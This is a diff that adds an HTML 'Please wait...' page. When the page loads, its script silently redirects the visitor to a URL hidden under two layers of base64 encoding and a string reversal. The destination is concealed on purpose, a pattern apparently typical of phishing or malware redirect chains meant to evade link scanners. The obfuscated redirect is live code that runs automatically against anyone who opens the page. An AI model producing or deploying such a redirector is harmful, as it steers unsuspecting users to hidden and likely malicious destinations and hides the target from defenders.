@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Please wait...</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const encodedUrl = "UzEwYmlWMWRtbDBMbDVXYXM1MmJ1NDJicFJYWXk5bVloeEdidk5XYmhWR2R1NFdhbjlHYnZBVVoybDJjekZHY0VOVEp5VldhbWxHZHVWR1pwdGlNMnRTWnlWM1lsTkhSelVpYnA1MlpwTjNLdDkyWXVVbWJweG1idlJuWnZOM2J5TldhdDVpYnBkMmJzOXlMNk1IYzBSSGE5d21jMVJXWW1FVFA0bG1ac0pYZG0wRlpwVldZekptWmZkM1piMURacFZXWWZOblltWlNSQlYwUVh0MFEyMVVXZnBGY0ZwM1VLdGtjQkJ6WkQxelpwTm5KemhIYkY5MlFuUm1WMVFUTjRRRk93RjNUb05UU3oxRWRRRmxaRVZtZTJ3VU9mTlhMTGhWTTJKV09vOWxldGNYUnhJMGFJVkhXMmtXVnpGelEwcFhiQ2xVTHRnVE1ZQnpaM1VXUXFKbGEyb1dkWFZHVjJvbVdVUnpkUk4yUk5WVFNTWlROQmhUVTRsMVE2bGxOMGNXTnZWSFp6RUVNS3gyY1hWR1IyOW1aNE1HY1RWVVk0RldaejRrYkJGV1ZTUm5NVzFrTTNGMGI0TUdTMzFHWmxSbGE0NEdPajkwWXdBVllHRjNWSmhUVGpKVmRUeDBTMDFtVU9GRVNLOWxZd0ZVUzRsVVYzTVZlS2hEVEUxQ013OFdZRWRuZXJKR1RHQlhSNHRHY3hsRmEzbFRkNUkwTU45RWJrSkdXeFFGY2hwa1dqQlhiQ2xsVjJjRVNCMUNXRHhXWnVOVlRyaFRXcEZqZHZ4MlI2TjJSaHBsTXRoVFM1WTFWRzlrUklsR1ZtRm5hbWhWVm1wWFkxMFNWbDkxU0JaMVFzaHpaeGdFU3RjSE1YdDBZTTFpY1NkbGEzUVVMd1pWUU1SRGFYaFRSc05sYk5CMVQxUWxZU2gxVjRWa2FJeFdVVVYzYnJka042RlVXMUlqTXo4MmFPUmtRVU5sUnlOMVFvVlROQlpFZHpwMlRCdFVROWtXWTQ5emFqbEdiajl5Y2pCM0wwVm1idXMyWXB4MllseG1ZMTlHWnVjbUxyTldhc05HWmg5eUw2TUhjMFJIYQ==";
+            try {
+                const originalUrl = atob(atob(encodedUrl).split('').reverse().join(''));
+                window.location.href = originalUrl;
+            } catch {
+                document.body.innerHTML = "<p>Failed to redirect. Invalid encoded URL.</p>";
+            }
+        });
+    </script>
+</head>
+<body>
+    <p>Please wait....</p>
+</body>
+</html>
